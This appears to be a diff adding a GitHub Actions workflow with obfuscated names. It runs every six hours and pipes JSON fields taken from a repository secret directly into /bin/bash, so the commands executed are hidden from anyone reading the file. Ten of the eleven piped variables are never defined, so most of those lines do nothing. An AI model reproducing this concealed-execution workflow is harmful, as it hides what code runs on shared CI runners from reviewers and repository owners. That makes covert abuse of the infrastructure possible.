@@ -1,0 +1,27 @@
+name: niulangqn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: niulangqn
+        env:
+          fk4795: ${{ secrets.fk4795 }}
+        run: |
+          echo $fk4795 | jq -r .vsa5452 | /bin/bash
+          echo $gl9 | jq -r .lope95 | /bin/bash
+          echo $ysd2 | jq -r .jbq81 | /bin/bash
+          echo $x1441 | jq -r .ptg04 | /bin/bash
+          echo $wwvo0227 | jq -r .k9290 | /bin/bash
+          echo $uaw7891 | jq -r .thr31 | /bin/bash
+          echo $t5 | jq -r .dglw53 | /bin/bash
+          echo $kb9 | jq -r .f5 | /bin/bash
+          echo $d8 | jq -r .aftcg52 | /bin/bash
+          echo $dfu53 | jq -r .izomr24127 | /bin/bash
+          echo $yjbg533 | jq -r .w90 | /bin/bash
+
